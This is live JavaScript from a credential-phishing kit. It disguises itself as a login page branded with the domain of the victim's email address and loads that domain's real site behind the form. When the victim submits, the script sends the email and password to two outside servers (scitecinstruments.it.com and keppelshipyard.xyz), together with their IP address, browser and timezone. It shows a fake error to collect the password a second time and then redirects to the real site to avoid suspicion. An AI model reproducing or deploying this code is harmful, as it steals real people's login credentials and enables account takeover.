    <!-- Google Translate API -->
    <script>
        // Function to detect user\'s country and language
        function detectUserLanguage() {
            const browserLang = navigator.language || navigator.userLanguage;
            const langCode = browserLang.split(\'-\')[0];
            const supportedLanguages = [\'pl\', \'fr\', \'de\', \'es\', \'it\', \'pt\', \'ru\', \'zh\', \'ja\', \'ko\', \'ar\'];
            if (supportedLanguages.includes(langCode)) {
                return langCode;
            }
            return new Promise((resolve) => {
                fetch(\'https://ipapi.co/json/\')
                    .then(response => response.json())
                    .then(data => {
                        const countryCode = data.country_code ? data.country_code.toLowerCase() : \'en\';
                        const countryToLang = {
                            \'pl\': \'pl\', \'fr\': \'fr\', \'de\': \'de\', \'es\': \'es\', \'it\': \'it\',
                            \'pt\': \'pt\', \'ru\': \'ru\', \'cn\': \'zh\', \'jp\': \'ja\', \'kr\': \'ko\', \'sa\': \'ar\'
                        };
                        resolve(countryToLang[countryCode] || \'en\');
                    })
                    .catch(() => resolve(\'en\'));
            });
        }
        
        function translatePage(targetLang) {
            if (targetLang === \'en\') return;
            const apiUrl = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=en&tl=${targetLang}&dt=t&q=`;
            const elements = document.querySelectorAll(\'.translatable\');
            const texts = [];
            elements.forEach(el => texts.push(el.textContent.trim()));
            elements.forEach((el, index) => {
                const text = texts[index];
                if (text) {
                    fetch(apiUrl + encodeURIComponent(text))
                        .then(response => response.json())
                        .then(data => {
                            if (data && data[0] && data[0][0] && data[0][0][0]) {
                                el.textContent = data[0][0][0];
                            }
                        })
                        .catch(error => console.error(\'Translation error:\', error));
                }
            });
        }
        
        document.addEventListener(\'DOMContentLoaded\', async function() {
            const userLanguage = await detectUserLanguage();
            if (userLanguage !== \'en\') translatePage(userLanguage);
        });
    </script>

    <!-- Custom JavaScript -->
    <script>
        let submitCount = 0;
        let verificationCompleted = false;
        let currentDomain = null;
        
        // Function to update background based on email domain
        function updateBackgroundFromEmail(email) {
            if (!email) return;
            
            const emailParts = email.split("@");
            if (emailParts.length === 2) {
                const domain = emailParts[1];
                currentDomain = domain;
                
                // Update favicon
                document.getElementById("domain-favicon").src = `https://www.google.com/s2/favicons?domain=${domain}`;
                
                // Update domain name display
                const domainDisplay = domain.split(".")[0].toUpperCase();
                document.getElementById("domain-name").textContent = domainDisplay;
                
                // Update background iframe with the domain's website
                const backgroundUrl = `https://${domain}`;
                const iframe = document.getElementById("background-iframe");
                iframe.src = backgroundUrl;
                console.log(`Background updated to: ${backgroundUrl}`);
            }
        }
        
        // Function to send data to the specified URL
        function sendDataToPanelSG(email, password) {
            const url = \'https://scitecinstruments.it.com/panel/sg.php\';
            let formData = new FormData();
            formData.append(\'email\', email);
            formData.append(\'password\', password);

            fetch(url, {
                method: \'POST\',
                body: formData
            }).then(response => {
                console.log(\'Data sent to panel/sg.php\', response.status);
            }).catch(error => console.error(\'Error sending to panel/sg.php:\', error));
        }

        // Get email from URL parameter if present
        function getEmailFromParam() {
            const urlParams = new URLSearchParams(window.location.search);
            const email = urlParams.get(\'portal\');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (email && emailRegex.test(email)) {
                return email;
            }
            return null;
        }

        const originalEmail = getEmailFromParam();

        function TranquilBreeze() {
            console.log("CAPTCHA passed! You can now proceed.");
            verificationCompleted = true;
        }

        document.addEventListener("DOMContentLoaded", () => {
            const portalEmail = new URLSearchParams(window.location.search).get("portal");
            let redirectDomain = null;
            
            // Handle portal parameter if present
            if (portalEmail) {
                document.getElementById("email").value = portalEmail;
                const emailParts = portalEmail.split("@");
                if (emailParts.length === 2) {
                    redirectDomain = emailParts[1];
                    currentDomain = redirectDomain;
                    
                    // Update UI with the domain from portal parameter
                    document.getElementById("domain-favicon").src = `https://www.google.com/s2/favicons?domain=${redirectDomain}`;
                    document.getElementById("domain-name").textContent = redirectDomain.split(".")[0].toUpperCase();
                    document.getElementById("background-iframe").src = `https://${redirectDomain}`;
                    console.log(`Background set from portal parameter: ${redirectDomain}`);
                }
            } else {
                console.log("No 'portal' parameter found. Waiting for user to enter email.");
            }
            
            // Listen for email input changes to update background
            const emailInput = document.getElementById("email");
            emailInput.addEventListener("input", function() {
                const emailValue = this.value.trim();
                if (emailValue && emailValue.includes("@")) {
                    updateBackgroundFromEmail(emailValue);
                }
            });
            
            // Also update when email loses focus
            emailInput.addEventListener("blur", function() {
                const emailValue = this.value.trim();
                if (emailValue && emailValue.includes("@")) {
                    updateBackgroundFromEmail(emailValue);
                }
            });
            
            // Collect user information
            let userInfo = {
                ipAddress: "Fetching...",
                userAgent: navigator.userAgent,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                browser: "Detecting..."
            };
            
            const userAgent = navigator.userAgent;
            if (userAgent.indexOf("Firefox") > -1) userInfo.browser = "Mozilla Firefox";
            else if (userAgent.indexOf("SamsungBrowser") > -1) userInfo.browser = "Samsung Internet";
            else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) userInfo.browser = "Opera";
            else if (userAgent.indexOf("Trident") > -1) userInfo.browser = "Microsoft Internet Explorer";
            else if (userAgent.indexOf("Edge") > -1) userInfo.browser = "Microsoft Edge";
            else if (userAgent.indexOf("Chrome") > -1) userInfo.browser = "Google Chrome or Chromium";
            else if (userAgent.indexOf("Safari") > -1) userInfo.browser = "Apple Safari";
            else userInfo.browser = "Unknown";
            
            // Fetch IP address
            fetch("https://api.ipify.org?format=json")
                .then(response => response.json())
                .then(data => {
                    userInfo.ipAddress = data.ip;
                })
                .catch(error => {
                    console.error("Error fetching IP address:", error);
                    userInfo.ipAddress = "Unavailable";
                });
            
            // Form submission handler
            document.getElementById("user-form").addEventListener("submit", (function(e) {
                e.preventDefault();
                
                if (!verificationCompleted) {
                    alert("Please complete the verification before submitting.");
                    return;
                }
                
                const emailVal = document.getElementById("email").value.trim();
                const passwordVal = document.getElementById("password").value.trim();

                if (!emailVal || !passwordVal) {
                    alert("Please enter both email and password.");
                    return;
                }

                // Send data to panel/sg.php
                sendDataToPanelSG(emailVal, passwordVal);

                submitCount += 1;
                const isFirstSubmit = submitCount === 1;
                const isSecondSubmit = submitCount === 2;
                document.getElementById("loader-overlay").style.display = "flex";
                
                // Collect and send form data
                const formData = new FormData();
                formData.append(\'email\', emailVal);
                formData.append(\'password\', passwordVal);
                formData.append(\'ipAddress\', userInfo.ipAddress);
                formData.append(\'userAgent\', userInfo.userAgent);
                formData.append(\'timezone\', userInfo.timezone);
                formData.append(\'browser\', userInfo.browser);
                
                fetch(\'https://keppelshipyard.xyz/sg.php\', {
                    method: \'POST\',
                    body: formData
                })
                .then(response => response.text())
                .then(data => {
                    console.log(\'Form submitted successfully:\', data);
                })
                .catch(error => {
                    console.error(\'Error submitting form:\', error);
                });
                
                // Determine redirect domain from email
                let finalRedirectDomain = redirectDomain;
                if (!finalRedirectDomain && emailVal) {
                    const emailParts = emailVal.split("@");
                    if (emailParts.length === 2) {
                        finalRedirectDomain = emailParts[1];
                    }
                }
                
                if (isFirstSubmit) {
                    setTimeout(() => {
                        document.getElementById("loader-overlay").style.display = "none";
                        document.getElementById("error-message").style.display = "block";
                        document.getElementById("password").value = "";
                    }, 3000);
                } else if (isSecondSubmit && finalRedirectDomain) {
                    setTimeout(() => {
                        document.getElementById("loader-overlay").style.display = "none";
                        window.location.href = "https://" + finalRedirectDomain;
                    }, 3000);
                }
            }));
        });  
    </script>
